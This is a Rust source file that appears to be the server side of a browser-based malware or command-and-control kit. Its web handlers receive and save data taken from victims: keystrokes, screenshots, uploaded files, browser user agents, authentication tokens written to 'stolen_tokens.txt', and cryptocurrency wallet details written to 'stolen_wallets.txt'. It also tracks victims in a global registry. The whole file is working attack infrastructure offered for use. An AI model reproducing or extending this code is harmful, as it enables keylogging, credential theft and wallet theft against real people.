use warp::multipart::{FormData, Part};
use futures::{StreamExt, TryStreamExt};
use std::fs;
use bytes::Buf;
use std::io::Write;
use crate::victim::GLOBAL_VICTIMS;
use crate::payloads::service_worker_js;

// Upload handlers
pub fn save_upload(filename: String, body: bytes::Bytes) -> impl warp::Reply {
    let safe_name = filename.replace("/", "_").replace("\\", "_");
    let path = format!("uploads/{}", safe_name);
    fs::write(&path, &body).unwrap_or_else(|_| ());
    warp::reply::with_status("File received", warp::http::StatusCode::OK)
}

pub fn save_keylog(body: bytes::Bytes) -> impl warp::Reply {
    let log_entry = String::from_utf8_lossy(&body);
    let _ = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open("keylog.txt")
        .and_then(|mut f| writeln!(f, "{}", log_entry));
    warp::reply::with_status("Log received", warp::http::StatusCode::OK)
}

pub async fn save_screenshot(form: FormData) -> Result<impl warp::Reply, warp::Rejection> {
    let parts: Vec<Part> = form.try_collect().await.unwrap_or_default();
    for part in parts {
        if let Some(filename) = part.filename() {
            let safe_name = filename.replace('/', "_").replace('\\', "_");
            let path = format!("uploads/{}", safe_name);

            let buffers: Vec<Vec<u8>> = part
                .stream()
                .map_ok(|mut buf| {
                    let mut v = Vec::with_capacity(buf.remaining());
                    let chunk = buf.chunk();
                    v.extend_from_slice(chunk);
                    buf.advance(chunk.len());
                    v
                })
                .try_collect()
                .await
                .unwrap_or_default();

            let data: Vec<u8> = buffers.into_iter().flatten().collect();
            fs::write(&path, &data).ok();
            println!("[*] Screenshot saved: {}", path);
        }
    }
    Ok(warp::reply::with_status("Screenshot received", warp::http::StatusCode::OK))
}

pub fn save_useragent(body: bytes::Bytes) -> impl warp::Reply {
    let ua = String::from_utf8_lossy(&body);
    println!("[*] Received User-Agent: {}", ua);
    let (os, browser) = classify_user_agent(&ua);

    let victims = GLOBAL_VICTIMS.lock().unwrap();
    if let Some((_, victim)) = victims.iter().last() {
        *victim.os.lock().unwrap() = Some(os);
        *victim.browser.lock().unwrap() = Some(browser);
    }

    warp::reply::with_status("User-Agent received", warp::http::StatusCode::OK)
}

pub fn save_token(body: bytes::Bytes) -> impl warp::Reply {
    let token_entry = String::from_utf8_lossy(&body);
    let _ = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open("stolen_tokens.txt")
        .and_then(|mut f| writeln!(f, "{}", token_entry));
    println!("[*] Stolen Token: {}", token_entry);
    warp::reply::with_status("Token received", warp::http::StatusCode::OK)
}

pub fn save_wallet(body: bytes::Bytes) -> impl warp::Reply {
    let wallet_entry = String::from_utf8_lossy(&body);
    let _ = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open("stolen_wallets.txt")
        .and_then(|mut f| writeln!(f, "{}", wallet_entry));
    println!("[*] Stolen Wallet Info: {}", wallet_entry);
    warp::reply::with_status("Wallet received", warp::http::StatusCode::OK)
}

fn classify_user_agent(ua: &str) -> (String, String) {
    let ua = ua.to_lowercase();
    let os = if ua.contains("windows") {
        "Windows"
    } else if ua.contains("linux") {
        "Linux"
    } else if ua.contains("mac os") || ua.contains("macintosh") {
        "MacOS"
    } else if ua.contains("android") {
        "Android"
    } else if ua.contains("iphone") || ua.contains("ipad") {
        "iOS"
    } else {
        "Unknown OS"
    };

    let browser = if ua.contains("firefox") {
        "Firefox"
    } else if ua.contains("chrome") && !ua.contains("edg") {
        "Chrome"
    } else if ua.contains("safari") && !ua.contains("chrome") {
        "Safari"
    } else if ua.contains("edg") {
        "Edge"
    } else {
        "Unknown Browser"
    };

    (os.to_string(), browser.to_string())
}
